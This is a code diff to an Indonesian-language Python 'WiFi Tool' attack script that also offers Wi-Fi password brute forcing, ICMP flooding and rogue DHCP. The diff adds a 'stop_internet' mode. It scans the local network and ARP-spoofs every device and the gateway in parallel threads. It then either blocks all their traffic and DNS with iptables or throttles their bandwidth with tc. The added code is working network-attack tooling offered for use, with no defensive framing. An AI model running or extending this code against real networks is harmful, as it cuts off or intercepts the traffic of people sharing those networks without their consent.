@@ -1,3 +1,5 @@
+#!/home/kali/Documents/projo/src/bin/python
+
 import pywifi
 from pywifi import PyWiFi
 from pywifi import const
@@ -206,6 +208,95 @@ def icmp_attack(ip, loop):
 def split_ip(ip):
     return ip.rsplit('.', 1)[0] + "."
 
+def change_ip(gateway):
+    return gateway.rsplit('.', 1)[0] + ".0/24"
+
+def enable_forwarding():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("[+] IP forwarding enabled.")
+
+def disable_forwarding():
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print("[+] IP forwarding disabled.")
+
+def block_internet(iface):
+    os.system("iptables -P FORWARD DROP")
+    os.system("iptables -P OUTPUT DROP")
+    os.system(f"iptables -A FORWARD -o {iface} -j DROP")
+    os.system(f"iptables -A OUTPUT -o {iface} -j DROP")
+    os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
+    os.system("iptables -A OUTPUT -p udp --dport 53 -j DROP")
+    print("[+] Internet access blocked for all devices.")
+
+def setup_tc(iface, limit_speed):
+    os.system(f"tc qdisc add dev {iface} root handle 1: htb default 30")
+    os.system(f"tc class add dev {iface} parent 1: classid 1:1 htb rate {limit_speed} ceil {limit_speed}")
+    os.system(f"tc filter add dev {iface} protocol ip parent 1:0 prio 1 u32 match ip dst 0.0.0.0/0 flowid 1:1")
+    print(f"[+] Bandwidth limited to {limit_speed} for all devices.")
+    
+def unblock_internet():
+    os.system("iptables -F")
+    os.system("iptables -X")
+    os.system("iptables -P FORWARD ACCEPT")
+    os.system("iptables -P OUTPUT ACCEPT")
+    print("[+] Internet access restored.")
+
+def clear_tc():
+    os.system(f"tc qdisc del dev {iface} root")
+    print("[+] Bandwidth limit removed.")
+
+def scan_hosts(ip_range, iface, gateway_ip):
+    print("[+] Scanning network for devices...")
+    ans, _ = arping(ip_range, iface=iface, timeout=2, verbose=False)
+    hosts = [rcv.psrc for snd, rcv in ans if rcv.psrc != gateway_ip]
+    print(f"[+] Found devices: {hosts}")
+    return hosts
+
+def arp_spoof(host, gateway_ip, iface):
+    target_mac = getmacbyip(host)
+    attacker_mac = get_if_hwaddr(iface)
+    gateway_mac = getmacbyip(gateway_ip)
+
+    pkt_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=host, hwdst=target_mac, 
+                                                psrc=gateway_ip, hwsrc=attacker_mac)
+    
+    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
+                                                  psrc=host, hwsrc=attacker_mac)
+    print("ARP SPOOF ACTIVE")
+    
+    while True:
+        try:
+            sendp(pkt_to_target, iface=iface, verbose=False)
+            sendp(pkt_to_gateway, iface=iface, verbose=False)
+            time.sleep(1.5)
+        except Exception:
+            break
+
+def broadcast_arp(pdst, iface, gateway_ip):
+    """ARP broadcast untuk semua host sekaligus"""
+    mac = get_if_hwaddr(iface)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp = ARP(op=2, pdst=pdst, psrc=gateway_ip, hwsrc=mac, hwdst="ff:ff:ff:ff:ff:ff")
+    
+    print(pdst)
+    while True:
+        sendp(ether / arp, iface=iface, count=3, verbose=False)
+        time.sleep(3)
+        
+def start_spoofing(hosts, pdst, iface, gateway_ip):
+    threads = []
+    for host in hosts:
+        t = threading.Thread(target=arp_spoof, args=(host, gateway_ip, iface,))
+        t.start()
+        threads.append(t)
+
+    t_broadcast = threading.Thread(target=broadcast_arp, args=(pdst, iface, gateway_ip,))
+    t_broadcast.daemon = True
+    t_broadcast.start()
+    threads.append(t_broadcast)
+
+    return threads
+
 def main():
  os.system('clear')
  ascii_art = pyfiglet.figlet_format("WiFi Tool")
@@ -216,6 +307,7 @@ def main():
  print()
  print("Untuk Bruteforce Wifi password:")
  print("Untuk scan Wi-Fi: python3 run.py --c scan_wifi_lists ")
+ print("sudo bin/python run.py --c scan_wifi_lists")
  print("Untuk melakukan serangan brute force Wi-Fi : python3 run.py --c crack_wifi_password --s TARGET_WIFI --w WORDLIST.txt")
  print()
  print("Untuk ICMP Flood:")
@@ -224,6 +316,9 @@ def main():
  print()
  print("Untuk DHCP Rogue:")
  print("Untuk melakukan serangan: python3 run.py --c dhcp_rogue --ip ATTACKER_IP --g GATEWAY --d DNS_IP --sub SUBNET_MASK --lt LEASE_TIME(432000 --i INTERFACE")
+ print()
+ print("Untuk Stop Internet:")
+ print("Untuk melakukan serangan: python3 run.py --c stop_internet --g GATEWAY --i INTERFACE --m MODE --p IP 3 DIGIT PERTAMA .255 ex(192.168.1.255)")
 
  parser = argparse.ArgumentParser()
  parser.add_argument('--loop', help='Gateway target untuk scan ip. cara penggunaan: --gateway 192.168.1.1/24')
@@ -235,7 +330,10 @@ def main():
  parser.add_argument('--s', help='SSID target (hanya untuk mode brute)')
  parser.add_argument('--w', help='Path ke file wordlist (hanya untuk mode brute)')
  parser.add_argument('--i', help='Interface atau hardware penghubung')
- parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dhcp_rogue'], help="Aksi yang ingin dilakukan")
+ parser.add_argument('--m', help='pilih mode untuk stop internet')
+ parser.add_argument('--p', help='pdst untuk stop internet')
+ parser.add_argument('--l', help='untuk limit bandwidth')
+ parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dhcp_rogue', 'stop_internet'], help="Aksi yang ingin dilakukan")
  args = parser.parse_args()
 
  if args.c == 'scan_wifi_lists':
@@ -246,6 +344,43 @@ def main():
   scan_ip(args.g)
  elif args.c == 'icmp_attack':
   icmp_attack(args.ip, args.loop)
+ elif args.c == 'stop_internet':
+  ip_range = change_ip(args.g)
+  gateway_ip = args.g
+  iface = args.i
+  pdst = args.p
+
+  if args.m == 'deauth':
+   print(args.m)
+   enable_forwarding()
+   hosts = scan_hosts(ip_range, iface, gateway_ip)
+   block_internet(iface)
+   print("[+] Starting ARP spoofing on all devices...")
+   threads = start_spoofing(hosts, pdst, iface, gateway_ip)
+  
+   try:
+     while True:
+         time.sleep(1)
+   except KeyboardInterrupt:
+         print("\n[!] Stopping...")
+         unblock_internet()
+         disable_forwarding()
+  elif args.m == 'limit':
+   print(args.m)
+   limit_speed = args.l
+   enable_forwarding()
+   hosts = scan_hosts(ip_range, iface, gateway_ip)
+   setup_tc(iface, limit_speed)
+   print("[+] Starting ARP spoofing on all devices...")
+   threads = start_spoofing(hosts, pdst, iface, gateway_ip)
+  
+   try:
+     while True:
+         time.sleep(1)
+   except KeyboardInterrupt:
+         print("\n[!] Stopping...")
+         clear_tc()
+         disable_forwarding()
  elif args.c == 'dhcp_rogue':
   splitted = split_ip(args.ip)
   print(splitted)
